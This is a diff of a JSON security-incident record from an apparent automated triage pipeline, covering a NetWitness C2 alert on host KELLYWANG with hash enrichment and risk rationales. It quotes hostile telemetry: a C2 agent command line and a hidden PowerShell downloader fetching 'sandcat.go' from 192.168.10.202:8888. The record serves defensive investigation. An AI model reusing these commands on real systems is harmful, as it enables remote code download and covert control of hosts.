@@ -1,24 +1,24 @@
 {
   "incident_id": "INC-53021",
   "classification": {
-    "alert_type": "Internal Hacking (inactive)",
+    "alert_type": "Suspicious Outbound Network Activity (Unverified)",
     "severity": "HIGH",
     "triage_risk_rating": {
       "likelihood_initiation": "High",
-      "likelihood_occurrence": "High",
+      "likelihood_occurrence": "Medium",
       "likelihood_adverse_impact": "High",
       "overall_risk": "High",
-      "rationale": "High-severity NetWitness alert with risk score 70, multiple IOC matches, suspicious hidden PowerShell execution, and anomalous process/network activity on internal host 192.168.10.204 to 192.168.10.202:8888 indicate a highly likely malicious event with likely operational impact."
+      "rationale": "High-confidence C2-style network activity from a suspicious executable in C:\\Users\\Public\\ with a high-risk NetWitness alert and IOC matches makes initiation and impact likely, while the single observed event with no repeated confirmed occurrences supports only medium occurrence."
     },
     "source_risk_score": 70
   },
   "incident_details": {
     "title": "High Risk Alerts: NetWitness Endpoint for KELLYWANG",
     "timestamp": "2025-12-01T07:33:39+00:00",
-    "description": "This alert shows suspicious endpoint activity on an internal host involving hidden PowerShell with ExecutionPolicy Bypass and a likely downloader pattern contacting an internal IP on port 8888. The process 'splunkd.exe' executing from Public with related IOCs and a privileged user context indicates probable malicious activity, but there is no clear evidence of active outbreak or confirmed data loss.",
+    "description": "NetWitness flagged a potential C2 connection from host KELLYWANG involving splunkd.exe executing from C:\\Users\\Public\\ and connecting to 192.168.10.202:8888. The binary and command line are suspicious for untrusted execution and possible command-and-control activity, but available telemetry does not confirm malware behavior or outbound exfiltration.",
     "mitre_att&ck": {
       "tactic": "Command and Control",
-      "technique": "T1105 Ingress Tool Transfer"
+      "technique": "T1071.001 Application Layer Protocol"
     }
   },
   "network_indicators": {
@@ -35,11 +35,8 @@
       "ip_addresses": [
         "192.168.10.202"
       ],
-      "domain": "KELLYWANG"
-    },
-    "observed_domains": [
-      "KELLYWANG"
-    ]
+      "port": 8888
+    }
   },
   "endpoint_indicators": {
     "user": "KELLYWANG\\Kelly Wang",
@@ -52,16 +49,20 @@
     ],
     "operating_system": "windows",
     "processes": {
-      "command_line": [
-        "splunkd.exe -server http://192.168.10.202:8888 -group red",
-        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server='http://192.168.10.202:8888'; $url=$server + '/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $"
-      ]
+      "process_name": "splunkd.exe",
+      "process_names": [
+        "splunkd.exe"
+      ],
+      "command_line": "splunkd.exe -server http://192.168.10.202:8888 -group red"
     },
     "files": {
       "filename": "splunkd.exe",
       "filenames": [
         "splunkd.exe",
         "powershell.exe"
+      ],
+      "filepath": [
+        "C:\\Users\\Public\\"
       ],
       "hashes": [
         "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
@@ -232,11 +233,11 @@
   "threat_intelligence_summary": "=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.",
   "threat_intelligence_enrichment": {
     "iocs": {
-      "possible_file_name": "['splunkd.exe']",
+      "possible_file_name": "splunkd.exe",
       "file_hash": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
       "powershell_analysis": {
         "encoded_command_present": false,
-        "powershell_indicator_present": true,
+        "powershell_indicator_present": false,
         "decode_status": "not_found",
         "encoded_command_count": 0,
         "decoded_command_count": 0,
@@ -249,8 +250,8 @@
       "powershell_enrichment_note": "Decoded PowerShell IOCs were included for enrichment when available.",
       "file_hashes": [
         "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
-        "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
         "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+        "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
         "6bb54b2d7a3d63578559239a79700ea3"
       ]
     },
@@ -414,33 +415,6 @@
         },
         {
           "status": "completed",
-          "indicator": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
-          "malicious": 0,
-          "suspicious": 0,
-          "harmless": 0,
-          "undetected": 71,
-          "reputation": -16,
-          "meaningful_name": "PowerShell.EXE",
-          "first_submission_date": 1706134374,
-          "last_analysis_date": 1791229281,
-          "timeout": 0,
-          "tags": [
-            "detect-debug-environment",
-            "legit",
-            "peexe",
-            "known-distributor",
-            "long-sleeps"
-          ],
-          "community_votes": {
-            "harmless": 2,
-            "malicious": 8
-          },
-          "detecting_engine_count": 0,
-          "type_description": "Win32 EXE",
-          "size": 435712
-        },
-        {
-          "status": "completed",
           "indicator": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
           "malicious": 48,
           "suspicious": 0,
@@ -519,6 +493,33 @@
         },
         {
           "status": "completed",
+          "indicator": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+          "malicious": 0,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 71,
+          "reputation": -16,
+          "meaningful_name": "PowerShell.EXE",
+          "first_submission_date": 1706134374,
+          "last_analysis_date": 1791307128,
+          "timeout": 0,
+          "tags": [
+            "detect-debug-environment",
+            "long-sleeps",
+            "known-distributor",
+            "peexe",
+            "legit"
+          ],
+          "community_votes": {
+            "harmless": 2,
+            "malicious": 8
+          },
+          "detecting_engine_count": 0,
+          "type_description": "Win32 EXE",
+          "size": 435712
+        },
+        {
+          "status": "completed",
           "indicator": "6bb54b2d7a3d63578559239a79700ea3",
           "malicious": 0,
           "suspicious": 0,
@@ -527,14 +528,14 @@
           "reputation": -16,
           "meaningful_name": "PowerShell.EXE",
           "first_submission_date": 1706134374,
-          "last_analysis_date": 1791229281,
+          "last_analysis_date": 1791307128,
           "timeout": 0,
           "tags": [
             "detect-debug-environment",
-            "legit",
-            "peexe",
+            "long-sleeps",
             "known-distributor",
-            "long-sleeps"
+            "peexe",
+            "legit"
           ],
           "community_votes": {
             "harmless": 2,
@@ -551,6 +552,16 @@
         {
           "status": "completed",
           "indicator": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+          "indicator_type": "file",
+          "pulse_count": 0,
+          "sections_available": [
+            "general",
+            "analysis"
+          ]
+        },
+        {
+          "status": "completed",
+          "indicator": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
           "indicator_type": "file",
           "pulse_count": 0,
           "sections_available": [
@@ -624,16 +635,6 @@
         },
         {
           "status": "completed",
-          "indicator": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
-          "indicator_type": "file",
-          "pulse_count": 0,
-          "sections_available": [
-            "general",
-            "analysis"
-          ]
-        },
-        {
-          "status": "completed",
           "indicator": "6bb54b2d7a3d63578559239a79700ea3",
           "indicator_type": "file",
           "pulse_count": 0,
@@ -646,8 +647,7 @@
     },
     "notes": [
       "No usable public IP indicators were found. AbuseIPDB, VirusTotal IP, and OTX IP lookups were skipped.",
-      "No usable external domain indicators were found. VirusTotal domain and OTX domain lookups were skipped.",
-      "PowerShell activity was detected, but no decodable EncodedCommand content was available for IOC extraction."
+      "No usable external domain indicators were found. VirusTotal domain and OTX domain lookups were skipped."
     ],
     "indicators": [
       {
@@ -798,147 +798,12 @@
         "hash_type": "sha256"
       },
       {
-        "value": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "value": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
         "type": "hash",
         "origins": [
           "Parsed file indicators",
           "Parsed IOC summary",
           "Related IOCs",
-          "NetWitness alert metadata"
-        ],
-        "eligible": true,
-        "status": "enriched",
-        "providers_queried": 2,
-        "providers_answered": 2,
-        "providers": {
-          "virustotal": {
-            "status": "completed",
-            "malicious": 0,
-            "suspicious": 0,
-            "harmless": 0,
-            "undetected": 71,
-            "reputation": -16,
-            "tags": [
-              "detect-debug-environment",
-              "legit",
-              "peexe",
-              "known-distributor",
-              "long-sleeps"
-            ],
-            "community_votes": {
-              "harmless": 2,
-              "malicious": 8
-            },
-            "detecting_engine_count": 0,
-            "analysed_vendors": 71,
-            "last_analysed_at": "2026-10-05T19:41:21+00:00",
-            "meaningful_name": "PowerShell.EXE",
-            "type_description": "Win32 EXE",
-            "first_submitted_at": "2024-01-24T22:12:54+00:00"
-          },
-          "abuseipdb": {
-            "status": "not_applicable"
-          },
-          "otx": {
-            "status": "completed",
-            "pulse_count": 1,
-            "related_pulses": [
-              "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing"
-            ],
-            "pulses": [
-              {
-                "name": "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing",
-                "created": "2026-05-15T23:01:06.396000",
-                "modified": "2026-05-15T23:01:06.396000",
-                "tags": [
-                  "brazil",
-                  "banking-trojan",
-                  "delphi",
-                  "mshta",
-                  "dga"
-                ],
-                "malware_families": [
-                  "Grandoreiro",
-                  "NewGrandoreiro"
-                ],
-                "adversary": "TA558",
-                "attack_ids": [
-                  "T1566",
-                  "T1055",
-                  "T1568.002"
-                ],
-                "tlp": "white"
-              }
-            ],
-            "pulse_tags": [
-              "brazil",
-              "banking-trojan",
-              "delphi",
-              "mshta",
-              "dga",
-              "pga",
-              "lolbin",
-              "phishing",
-              "c2",
-              "python"
-            ],
-            "malware_families": [
-              "Grandoreiro",
-              "NewGrandoreiro",
-              "Newgrandoreiro"
-            ],
-            "adversaries": [
-              "TA558"
-            ],
-            "attack_ids": [
-              "T1566",
-              "T1055",
-              "T1568.002"
-            ],
-            "latest_pulse_modified": "2026-05-15T23:01:06.396000"
-          }
-        },
-        "context": [
-          {
-            "field": "meaningful_name",
-            "label": "File name (VirusTotal)",
-            "value": "PowerShell.EXE",
-            "sources": [
-              "VirusTotal"
-            ]
-          },
-          {
-            "field": "type_description",
-            "label": "File type",
-            "value": "Win32 EXE",
-            "sources": [
-              "VirusTotal"
-            ]
-          }
-        ],
-        "freshness": [
-          {
-            "label": "First submitted to VirusTotal",
-            "value": "2024-01-24T22:12:54+00:00",
-            "source": "VirusTotal"
-          },
-          {
-            "label": "Last VirusTotal analysis",
-            "value": "2026-10-05T19:41:21+00:00",
-            "source": "VirusTotal"
-          },
-          {
-            "label": "Most recent OTX pulse update",
-            "value": "2026-05-15T23:01:06.396000",
-            "source": "AlienVault OTX"
-          }
-        ],
-        "hash_type": "sha256"
-      },
-      {
-        "value": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
-        "type": "hash",
-        "origins": [
           "NetWitness alert metadata"
         ],
         "eligible": true,
@@ -1079,6 +944,141 @@
         "hash_type": "md5"
       },
       {
+        "value": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "type": "hash",
+        "origins": [
+          "NetWitness alert metadata"
+        ],
+        "eligible": true,
+        "status": "enriched",
+        "providers_queried": 2,
+        "providers_answered": 2,
+        "providers": {
+          "virustotal": {
+            "status": "completed",
+            "malicious": 0,
+            "suspicious": 0,
+            "harmless": 0,
+            "undetected": 71,
+            "reputation": -16,
+            "tags": [
+              "detect-debug-environment",
+              "long-sleeps",
+              "known-distributor",
+              "peexe",
+              "legit"
+            ],
+            "community_votes": {
+              "harmless": 2,
+              "malicious": 8
+            },
+            "detecting_engine_count": 0,
+            "analysed_vendors": 71,
+            "last_analysed_at": "2026-10-06T17:18:48+00:00",
+            "meaningful_name": "PowerShell.EXE",
+            "type_description": "Win32 EXE",
+            "first_submitted_at": "2024-01-24T22:12:54+00:00"
+          },
+          "abuseipdb": {
+            "status": "not_applicable"
+          },
+          "otx": {
+            "status": "completed",
+            "pulse_count": 1,
+            "related_pulses": [
+              "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing"
+            ],
+            "pulses": [
+              {
+                "name": "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing",
+                "created": "2026-05-15T23:01:06.396000",
+                "modified": "2026-05-15T23:01:06.396000",
+                "tags": [
+                  "brazil",
+                  "banking-trojan",
+                  "delphi",
+                  "mshta",
+                  "dga"
+                ],
+                "malware_families": [
+                  "Grandoreiro",
+                  "NewGrandoreiro"
+                ],
+                "adversary": "TA558",
+                "attack_ids": [
+                  "T1566",
+                  "T1055",
+                  "T1568.002"
+                ],
+                "tlp": "white"
+              }
+            ],
+            "pulse_tags": [
+              "brazil",
+              "banking-trojan",
+              "delphi",
+              "mshta",
+              "dga",
+              "pga",
+              "lolbin",
+              "phishing",
+              "c2",
+              "python"
+            ],
+            "malware_families": [
+              "Grandoreiro",
+              "NewGrandoreiro",
+              "Newgrandoreiro"
+            ],
+            "adversaries": [
+              "TA558"
+            ],
+            "attack_ids": [
+              "T1566",
+              "T1055",
+              "T1568.002"
+            ],
+            "latest_pulse_modified": "2026-05-15T23:01:06.396000"
+          }
+        },
+        "context": [
+          {
+            "field": "meaningful_name",
+            "label": "File name (VirusTotal)",
+            "value": "PowerShell.EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "type_description",
+            "label": "File type",
+            "value": "Win32 EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          }
+        ],
+        "freshness": [
+          {
+            "label": "First submitted to VirusTotal",
+            "value": "2024-01-24T22:12:54+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Last VirusTotal analysis",
+            "value": "2026-10-06T17:18:48+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Most recent OTX pulse update",
+            "value": "2026-05-15T23:01:06.396000",
+            "source": "AlienVault OTX"
+          }
+        ],
+        "hash_type": "sha256"
+      },
+      {
         "value": "6bb54b2d7a3d63578559239a79700ea3",
         "type": "hash",
         "origins": [
@@ -1098,10 +1098,10 @@
             "reputation": -16,
             "tags": [
               "detect-debug-environment",
-              "legit",
-              "peexe",
+              "long-sleeps",
               "known-distributor",
-              "long-sleeps"
+              "peexe",
+              "legit"
             ],
             "community_votes": {
               "harmless": 2,
@@ -1109,7 +1109,7 @@
             },
             "detecting_engine_count": 0,
             "analysed_vendors": 71,
-            "last_analysed_at": "2026-10-05T19:41:21+00:00",
+            "last_analysed_at": "2026-10-06T17:18:48+00:00",
             "meaningful_name": "PowerShell.EXE",
             "type_description": "Win32 EXE",
             "first_submitted_at": "2024-01-24T22:12:54+00:00"
@@ -1148,7 +1148,7 @@
           },
           {
             "label": "Last VirusTotal analysis",
-            "value": "2026-10-05T19:41:21+00:00",
+            "value": "2026-10-06T17:18:48+00:00",
             "source": "VirusTotal"
           }
         ],
@@ -1195,43 +1195,9 @@
         "providers_answered": 0
       },
       {
-        "value": "['kellywang']",
-        "type": "domain",
-        "origins": [
-          "Parsed user/host indicators",
-          "Parsed IOC summary",
-          "Alert field",
-          "Related IOCs"
-        ],
-        "eligible": false,
-        "status": "excluded",
-        "status_category": "internal_hostname",
-        "status_reason": "Internal hostname — no public domain suffix",
-        "providers_queried": 0,
-        "providers_answered": 0
-      },
-      {
-        "value": "['splunkd.exe']",
-        "type": "file_name",
-        "origins": [
-          "Parsed file indicators",
-          "Parsed IOC summary",
-          "Alert field",
-          "Related IOCs"
-        ],
-        "eligible": false,
-        "status": "excluded",
-        "status_category": "unsupported_type",
-        "status_reason": "Not enriched — file reputation lookups require a file hash",
-        "providers_queried": 0,
-        "providers_answered": 0
-      },
-      {
         "value": "kellywang",
         "type": "domain",
         "origins": [
-          "Parsed user/host indicators",
-          "Parsed IOC summary",
           "Related IOCs"
         ],
         "eligible": false,
@@ -1242,11 +1208,12 @@
         "providers_answered": 0
       },
       {
-        "value": "['powershell.exe']",
+        "value": "splunkd.exe",
         "type": "file_name",
         "origins": [
           "Parsed file indicators",
           "Parsed IOC summary",
+          "Alert field",
           "Related IOCs"
         ],
         "eligible": false,
@@ -1258,10 +1225,10 @@
       }
     ],
     "coverage": {
-      "extracted": 10,
+      "extracted": 8,
       "eligible": 4,
       "enriched": 4,
-      "excluded": 6,
+      "excluded": 4,
       "skipped": 0,
       "skipped_by_limit": 0,
       "provider_requests": 8,
@@ -1280,15 +1247,15 @@
           "skipped": 0
         },
         "domain": {
-          "extracted": 2,
+          "extracted": 1,
           "enriched": 0,
-          "excluded": 2,
+          "excluded": 1,
           "skipped": 0
         },
         "file_name": {
-          "extracted": 2,
+          "extracted": 1,
           "enriched": 0,
-          "excluded": 2,
+          "excluded": 1,
           "skipped": 0
         }
       }
@@ -1335,5 +1302,5 @@
     "VirusTotal reported 48 malicious detection(s) for the file hash.",
     "AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb."
   ],
-  "investigation_context_brief": "=== INVESTIGATION CONTEXT BRIEF (canonical stage results; bounded) ===\n[CASE]\nCase ID (Investigation subject): INC-53021\nTitle: High Risk Alerts: NetWitness Endpoint for KELLYWANG\nIncident time: 2025-12-01T07:33:39+00:00\nNetWitness: risk score 70; priority HIGH; created 2025-12-01T07:33:39.338+00:00; sources ECAT; alerts 6\n[TRIAGE]\nTriage level: HIGH (Triage classification -- not the NetWitness severity)\nCategory: Internal Hacking (inactive)\nRisk dimensions: initiation High, occurrence High, adverse impact High, overall High\nRisk rationale: High-severity NetWitness alert with risk score 70, multiple IOC matches, suspicious hidden PowerShell execution, and anomalous process/network activity on internal host 192.168.10.204 to 192.168.10.202:8888 indicate a highly likely malicious event with likely operational impact.\nMITRE (Triage): tactic Command and Control; technique T1105 Ingress Tool Transfer\nTriage interpretation (Triage agent's assessment, not a factual incident description): This alert shows suspicious endpoint activity on an internal host involving hidden PowerShell with ExecutionPolicy Bypass and a likely downloader pattern contacting an internal IP on port 8888. The process 'splunkd.exe' executing from Public with related IOCs and a privileged user context indicates probable mal…\nTriage IOC checklist findings: [CONFIDENTIALITY] Changes in network traffic telemetry (known bad IPs/domains), Unknown traffic originating from/terminating on the device, Unexplained changes from privileged accounts — There is network traffic to an internal destination on port 8888 with a suspicious PowerShell download pattern, consistent with unusual communications and possible exfil/remote cont…\nNetWitness source risk score: 70\n[ENTITIES & TELEMETRY]\nOrigins: P=Parsing, T=Triage metakeys, NW=NetWitness alert metadata, INC=incident record, H=raw-incident heuristic, H-title=incident title heuristic\nSource IPs (3): 192.168.10.204 [T,P,NW,H]; 192.168.10.202 [H]; 192.168.20.16 [H]\nDestination IPs (1): 192.168.10.202 [T,P,NW,H]\nUsers (1): KELLYWANG\\Kelly Wang [T,P,NW,H]\nEndpoint hosts (1): KELLYWANG [T,INC,P,NW,H-title]\nDomains (role not asserted) (1): KELLYWANG [T,P]\nFile hashes (4): 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 [T,P,NW]; 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 [T,NW]; 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb [T,P,NW]; 6bb54b2d7a3d63578559239a79700ea3 [T,NW]\nFiles (2): splunkd.exe [T,NW]; powershell.exe [T,NW]\nCommand line: splunkd.exe -server http://192.168.10.202:8888 -group red\nCommand line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server='http://192.168.10.202:8888'; $url=$server + '/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file'…\nNetwork detail [Triage metakeys / NetWitness alert metadata]: destination domain KELLYWANG\nOperating system: windows\nNetWitness alerts listed after this brief: 6\n[THREAT INTELLIGENCE]\n=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.\nTI stage status: completed\nTI contract: multi-indicator (per-IOC roles, origins and provider verdicts)\nCoverage: extracted 10, eligible 4, enriched 4, excluded 6, skipped 0 (by limit 0; limit 10 per type)\nProvider coverage: AbuseIPDB not_applicable (queried 0/0, failed 0); AlienVault OTX available (queried 4/4, failed 0); VirusTotal available (queried 4/4, failed 0)\nIntelligence gaps: none recorded\nNOT enriched: 2 excluded/internal_hostname, 2 excluded/private, 2 excluded/unsupported_type -- e.g. 192.168.10.204, 192.168.10.202, ['kellywang'], ['splunkd.exe'], kellywang, ['powershell.exe']\nTI warnings: none recorded\nTI recommended next action: Medium enrichment risk was identified — review the risk reasons below.\nEnriched indicators (4, highest provider evidence first):\n- 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 | hash | role: not recorded | origin: NetWitness alert metadata | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+3) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 0 malicious, 0 suspicious of 71 | OTX: 1 pulses\n- 6bb54b2d7a3d63578559239a79700ea3 | hash | role: not recorded | origin: NetWitness alert metadata | VT: 0 malicious, 0 suspicious of 71 | OTX: 0 pulses\n[DATA QUALITY / LIMITATIONS]\nParser confidence: High\nParsing warnings: Missing context-relevant parsing fields: protocol\nParsing missing fields (not present in telemetry): protocol\n=== END INVESTIGATION CONTEXT BRIEF ==="
+  "investigation_context_brief": "=== INVESTIGATION CONTEXT BRIEF (canonical stage results; bounded) ===\n[CASE]\nCase ID (Investigation subject): INC-53021\nTitle: High Risk Alerts: NetWitness Endpoint for KELLYWANG\nIncident time: 2025-12-01T07:33:39+00:00\nNetWitness: risk score 70; priority HIGH; created 2025-12-01T07:33:39.338+00:00; sources ECAT; alerts 6\n[TRIAGE]\nTriage level: HIGH (Triage classification -- not the NetWitness severity)\nCategory: Suspicious Outbound Network Activity (Unverified)\nRisk dimensions: initiation High, occurrence Medium, adverse impact High, overall High\nRisk rationale: High-confidence C2-style network activity from a suspicious executable in C:\\Users\\Public\\ with a high-risk NetWitness alert and IOC matches makes initiation and impact likely, while the single observed event with no repeated confirmed occurrences supports only medium occurrence.\nMITRE (Triage): tactic Command and Control; technique T1071.001 Application Layer Protocol\nTriage interpretation (Triage agent's assessment, not a factual incident description): NetWitness flagged a potential C2 connection from host KELLYWANG involving splunkd.exe executing from C:\\Users\\Public\\ and connecting to 192.168.10.202:8888. The binary and command line are suspicious for untrusted execution and possible command-and-control activity, but available telemetry does not confirm mal…\nTriage IOC checklist findings: [CONFIDENTIALITY] Anomalous outbound external communication — Matched IOC [1] due to anomalous outbound/internal communication: source IP 192.168.10.204 (source port 49888) connected to destination IP 192.168.10.202 on non-standard port 8888, with NetWitness alert \"Potential C2 Connection (Kelly)\" and command line targeting http://192.168.10.202:8888. [INTEGRITY] Un…\nNetWitness source risk score: 70\n[ENTITIES & TELEMETRY]\nOrigins: P=Parsing, T=Triage metakeys, NW=NetWitness alert metadata, INC=incident record, H=raw-incident heuristic, H-title=incident title heuristic\nSource IPs (3): 192.168.10.204 [T,P,NW,H]; 192.168.10.202 [H]; 192.168.20.16 [H]\nDestination IPs (1): 192.168.10.202 [T,P,NW,H]\nUsers (1): KELLYWANG\\Kelly Wang [P,NW,H]\nEndpoint hosts (1): KELLYWANG [INC,P,NW,H-title]\nFile hashes (4): 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 [T,P,NW]; 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 [T,P,NW]; 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb [T,NW]; 6bb54b2d7a3d63578559239a79700ea3 [T,NW]\nFiles (2): splunkd.exe [T,P,NW]; powershell.exe [T,NW]\nProcesses (1): splunkd.exe [P]\nCommand line: splunkd.exe -server http://192.168.10.202:8888 -group red\nNetwork detail [Triage metakeys / NetWitness alert metadata]: destination port 8888\nOperating system: windows\nFile path: ['C:\\\\Users\\\\Public\\\\']\nNetWitness alerts listed after this brief: 6\n[THREAT INTELLIGENCE]\n=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.\nTI stage status: completed\nTI contract: multi-indicator (per-IOC roles, origins and provider verdicts)\nCoverage: extracted 8, eligible 4, enriched 4, excluded 4, skipped 0 (by limit 0; limit 10 per type)\nProvider coverage: AbuseIPDB not_applicable (queried 0/0, failed 0); AlienVault OTX available (queried 4/4, failed 0); VirusTotal available (queried 4/4, failed 0)\nIntelligence gaps: none recorded\nNOT enriched: 1 excluded/internal_hostname, 2 excluded/private, 1 excluded/unsupported_type -- e.g. 192.168.10.204, 192.168.10.202, kellywang, splunkd.exe\nTI warnings: none recorded\nTI recommended next action: Medium enrichment risk was identified — review the risk reasons below.\nEnriched indicators (4, highest provider evidence first):\n- 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+3) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb | hash | role: not recorded | origin: NetWitness alert metadata | VT: 0 malicious, 0 suspicious of 71 | OTX: 1 pulses\n- 6bb54b2d7a3d63578559239a79700ea3 | hash | role: not recorded | origin: NetWitness alert metadata | VT: 0 malicious, 0 suspicious of 71 | OTX: 0 pulses\n[DATA QUALITY / LIMITATIONS]\nParsing warnings: Missing context-relevant parsing fields: alert_time, protocol\nParsing missing fields (not present in telemetry): alert_time, protocol\n=== END INVESTIGATION CONTEXT BRIEF ==="
 }
